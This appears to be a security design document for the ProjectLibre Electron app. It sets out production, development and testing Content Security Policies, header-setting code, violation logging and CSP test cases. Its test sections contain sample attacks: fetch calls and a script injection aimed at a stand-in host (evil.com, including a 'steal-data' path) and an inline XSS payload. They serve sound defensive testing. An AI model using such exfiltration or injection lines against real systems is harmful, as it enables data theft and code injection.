# Content Security Policy (CSP) Configuration

## Overview

This document defines the Content Security Policy for ProjectLibre Electron application, providing defense-in-depth security against XSS, data injection, and code injection attacks.

## CSP Directives Configuration

### Production CSP Policy

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self' ws: wss:; frame-src 'none'; object-src 'none'; media-src 'self'; manifest-src 'self'; worker-src 'none'; base-uri 'self'; form-action 'none'; frame-ancestors 'none';
```

### Development CSP Policy

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https: http:; font-src 'self' data:; connect-src 'self' ws: wss: http: https:; frame-src 'none'; object-src 'none'; media-src 'self'; manifest-src 'self'; worker-src 'self' blob:; base-uri 'self'; form-action 'none'; frame-ancestors 'none';
```

## Directive Breakdown

### Core Directives

#### `default-src 'self'`
- **Purpose**: Default policy for all unspecified directives
- **Security Impact**: Only allows resources from same origin
- **Risk Mitigation**: Prevents loading of external malicious resources

#### `script-src 'self'` (Production) / `'self' 'unsafe-eval' 'unsafe-inline'` (Development)
- **Purpose**: Controls JavaScript execution
- **Production**: Only allows same-origin scripts
- **Development**: Allows eval() and inline scripts for React development
- **Security Impact**: Prevents XSS attacks from external scripts

#### `style-src 'self' 'unsafe-inline'`
- **Purpose**: Controls CSS loading
- **Allows**: Same-origin stylesheets and inline styles
- **Risk Mitigation**: Prevents CSS-based data injection
- **Note**: 'unsafe-inline' required for React's style injection

### Resource Directives

#### `img-src 'self' data: https:`
- **Purpose**: Controls image loading
- **Allows**: Same-origin images, data URIs, HTTPS images
- **Security Impact**: Prevents malicious image-based attacks
- **Use Case**: User project avatars, charts, exported images

#### `font-src 'self' data:`
- **Purpose**: Controls font loading
- **Allows**: Same-origin fonts and data URIs
- **Security Impact**: Prevents font-based attacks
- **Use Case**: Custom fonts for UI

#### `connect-src 'self' ws: wss:` (Production) / `http: https:` (Development)
- **Purpose**: Controls network requests
- **Production**: Same-origin and WebSocket connections
- **Development**: Includes development server connections
- **Security Impact**: Prevents data exfiltration and CSRF

### Container Directives

#### `frame-src 'none'`
- **Purpose**: Blocks iframe embedding
- **Security Impact**: Prevents clickjacking attacks
- **Rationale**: ProjectLibre doesn't require iframes

#### `object-src 'none'`
- **Purpose**: Blocks plugin content (Flash, Java applets, etc.)
- **Security Impact**: Prevents plugin-based attacks
- **Rationale**: Modern web doesn't require plugins

#### `media-src 'self'`
- **Purpose**: Controls audio/video loading
- **Security Impact**: Prevents malicious media-based attacks
- **Use Case**: Project tutorial videos, audio notifications

#### `manifest-src 'self'`
- **Purpose**: Controls web app manifest loading
- **Security Impact**: Prevents manifest-based attacks
- **Use Case**: Progressive Web App features

### Navigation Directives

#### `base-uri 'self'`
- **Purpose**: Controls base URL for relative URLs
- **Security Impact**: Prevents base tag injection
- **Rationale**: Ensures consistent URL resolution

#### `form-action 'none'`
- **Purpose**: Controls form submission targets
- **Security Impact**: Prevents form-based CSRF attacks
- **Rationale**: ProjectLibre uses API calls, not form submissions

#### `frame-ancestors 'none'`
- **Purpose**: Controls embedding of the application
- **Security Impact**: Prevents clickjacking from external sites
- **Rationale**: Desktop app shouldn't be embedded in websites

### Worker Directives

#### `worker-src 'none'` (Production) / `'self' blob:` (Development)
- **Purpose**: Controls Web Worker creation
- **Production**: Disables workers for maximum security
- **Development**: Allows workers for development tools
- **Security Impact**: Prevents worker-based attacks

## Implementation Details

### Electron Integration

```javascript
// In main process
const csp = {
    'default-src': ["'self'"],
    'script-src': ["'self'"],
    'style-src': ["'self'", "'unsafe-inline'"],
    'img-src': ["'self'", 'data:', 'https:'],
    'font-src': ["'self'", 'data:'],
    'connect-src': ["'self'", 'ws:', 'wss:'],
    'frame-src': ["'none'"],
    'object-src': ["'none'"],
    'media-src': ["'self'"],
    'manifest-src': ["'self'"],
    'worker-src': ["'none'"],
    'base-uri': ["'self'"],
    'form-action': ["'none'"],
    'frame-ancestors': ["'none'"]
};

const cspString = Object.entries(csp)
    .map(([key, values]) => `${key} ${values.join(' ')}`)
    .join('; ');

session.webRequest.onHeadersReceived((details, callback) => {
    callback({
        responseHeaders: {
            ...details.responseHeaders,
            'Content-Security-Policy': [cspString],
            'X-Content-Type-Options': ['nosniff'],
            'X-Frame-Options': ['DENY'],
            'X-XSS-Protection': ['1; mode=block'],
            'Referrer-Policy': ['strict-origin-when-cross-origin']
        }
    });
});
```

### Environment-Specific Policies

#### Development Mode
```javascript
const devCsp = {
    'script-src': ["'self'", "'unsafe-eval'", "'unsafe-inline'"],
    'connect-src': ["'self'", 'ws:', 'wss:', 'http:', 'https:'],
    'worker-src': ["'self'", 'blob:']
};
```

#### Production Mode
```javascript
const prodCsp = {
    'script-src': ["'self'"],
    'connect-src': ["'self'", 'ws:', 'wss:'],
    'worker-src': ["'none'"]
};
```

#### Testing Mode
```javascript
const testCsp = {
    'script-src': ["'self'", "'unsafe-eval'"],
    'connect-src': ["'self'", 'ws:', 'wss:', 'http:', 'https:']
};
```

## Security Headers

### Additional Security Headers

#### `X-Content-Type-Options: nosniff`
- **Purpose**: Prevents MIME type sniffing
- **Security Impact**: Prevents content-type confusion attacks

#### `X-Frame-Options: DENY`
- **Purpose**: Legacy clickjacking protection
- **Security Impact**: Complements frame-src 'none'

#### `X-XSS-Protection: 1; mode=block`
- **Purpose**: Legacy XSS protection in older browsers
- **Security Impact**: Additional XSS protection layer

#### `Referrer-Policy: strict-origin-when-cross-origin`
- **Purpose**: Controls referrer information
- **Security Impact**: Prevents sensitive URL leakage

## CSP Violation Reporting

### Violation Monitoring

```javascript
// In preload script
window.addEventListener('securitypolicyviolation', (event) => {
    console.error('CSP Violation:', {
        violatedDirective: event.violatedDirective,
        blockedURI: event.blockedURI,
        documentURI: event.documentURI,
        originalPolicy: event.originalPolicy,
        referrer: event.referrer,
        timeStamp: event.timeStamp
    });
    
    // Report to main process
    ipcRenderer.invoke('csp-violation', {
        violatedDirective: event.violatedDirective,
        blockedURI: event.blockedURI,
        documentURI: event.documentURI
    });
});

// In main process
ipcMain.handle('csp-violation', (event, violation) => {
    console.warn('CSP Violation in renderer:', violation);
    
    // Log to file for security audit
    const logEntry = {
        timestamp: new Date().toISOString(),
        violation: violation,
        source: event.sender.getFrameId()
    };
    
    // Write to security log
    fs.appendFileSync('security.log', JSON.stringify(logEntry) + '\n');
});
```

### Violation Analysis

```javascript
class CSPViolationAnalyzer {
    constructor() {
        this.violations = [];
        this.thresholds = {
            maxViolationsPerMinute: 10,
            maxUniqueViolationsPerHour: 50
        };
    }
    
    addViolation(violation) {
        const now = Date.now();
        this.violations.push({ ...violation, timestamp: now });
        
        // Check for attack patterns
        if (this.detectAttackPattern()) {
            this.triggerSecurityResponse();
        }
    }
    
    detectAttackPattern() {
        const recentViolations = this.violations.filter(
            v => Date.now() - v.timestamp < 60000 // Last minute
        );
        
        // Too many violations in short time
        if (recentViolations.length > this.thresholds.maxViolationsPerMinute) {
            return true;
        }
        
        // Repeated violation of same directive
        const directiveCounts = {};
        recentViolations.forEach(v => {
            directiveCounts[v.violatedDirective] = 
                (directiveCounts[v.violatedDirective] || 0) + 1;
        });
        
        const maxCount = Math.max(...Object.values(directiveCounts));
        if (maxCount > 5) { // Same directive violated 5+ times
            return true;
        }
        
        return false;
    }
    
    triggerSecurityResponse() {
        console.error('Attack pattern detected - triggering security response');
        
        // Options:
        // 1. Restrict functionality
        // 2. Alert user
        // 3. Quarantine session
        // 4. Report to security team
        
        ipcMain.emit('security-incident', {
            type: 'csp-violation-pattern',
            severity: 'high',
            timestamp: new Date().toISOString()
        });
    }
}
```

## Testing CSP

### Test Scenarios

#### 1. XSS Prevention
```javascript
// Test injection attempt
const maliciousInput = '<script>alert("XSS")</script>';

// Should be blocked by CSP script-src directive
document.getElementById('test').innerHTML = maliciousInput;
```

#### 2. Data Exfiltration Prevention
```javascript
// Test external connection attempt
fetch('https://evil.com/steal-data')
    .then(response => response.text())
    .then(data => console.log(data));

// Should be blocked by CSP connect-src directive
```

#### 3. Clickjacking Prevention
```javascript
// Test iframe embedding
<iframe src="file:///path/to/projectlibre"></iframe>

// Should be blocked by CSP frame-src directive
```

### Automated CSP Testing

```javascript
class CSPTester {
    constructor() {
        this.testResults = [];
    }
    
    async runAllTests() {
        await this.testScriptInjection();
        await this.testExternalConnection();
        await this.testIframeEmbedding();
        await this.testStyleInjection();
        await this.testFontLoading();
        
        this.generateReport();
    }
    
    async testScriptInjection() {
        try {
            const script = document.createElement('script');
            script.src = 'https://evil.com/malicious.js';
            document.head.appendChild(script);
            
            // Wait for potential execution
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            if (window.maliciousVariable) {
                this.recordTest('script-injection', false, 'Script injection not blocked');
            } else {
                this.recordTest('script-injection', true, 'Script injection properly blocked');
            }
        } catch (error) {
            this.recordTest('script-injection', true, 'Script injection blocked with error');
        }
    }
    
    async testExternalConnection() {
        try {
            const response = await fetch('https://evil.com/test');
            const data = await response.text();
            
            this.recordTest('external-connection', false, 'External connection not blocked');
        } catch (error) {
            this.recordTest('external-connection', true, 'External connection properly blocked');
        }
    }
    
    recordTest(testName, passed, message) {
        this.testResults.push({
            test: testName,
            passed,
            message,
            timestamp: new Date().toISOString()
        });
    }
    
    generateReport() {
        const passed = this.testResults.filter(r => r.passed).length;
        const total = this.testResults.length;
        
        console.log(`CSP Test Results: ${passed}/${total} tests passed`);
        
        this.testResults.forEach(result => {
            console.log(`${result.passed ? '✅' : '❌'} ${result.test}: ${result.message}`);
        });
        
        return {
            passed,
            total,
            success: passed === total,
            results: this.testResults
        };
    }
}
```

## Migration Guide

### From Insecure to Secure CSP

#### Phase 1: Basic CSP (Week 1)
```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';
```

#### Phase 2: Enhanced Security (Week 2)
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;
```

#### Phase 3: Full Security (Week 3)
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self'; frame-src 'none'; object-src 'none';
```

#### Phase 4: Production Ready (Week 4)
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self' ws: wss:; frame-src 'none'; object-src 'none'; media-src 'self'; manifest-src 'self'; worker-src 'none'; base-uri 'self'; form-action 'none'; frame-ancestors 'none';
```

## Best Practices

### 1. Policy Development
- Start with restrictive policy and relax as needed
- Use different policies for development and production
- Test thoroughly before deployment
- Monitor violations in production

### 2. Directive Selection
- Use 'none' for unused features
- Prefer 'self' over wildcards
- Avoid 'unsafe-inline' and 'unsafe-eval' when possible
- Use specific hostnames instead of wildcards

### 3. Monitoring and Maintenance
- Log all CSP violations
- Analyze violation patterns
- Update policy based on legitimate violations
- Regular security audits

### 4. Performance Considerations
- CSP adds minimal overhead
- Browser optimization for CSP is good
- Monitor for any performance impact
- Test with real-world scenarios

## Conclusion

This CSP configuration provides comprehensive protection against web-based attacks while maintaining the functionality required by ProjectLibre. The policy is designed to be:

1. **Secure**: Blocks common attack vectors
2. **Functional**: Allows required application features
3. **Maintainable**: Easy to understand and modify
4. **Monitorable**: Provides visibility into violations

Regular review and updates of the CSP policy are essential for maintaining security effectiveness.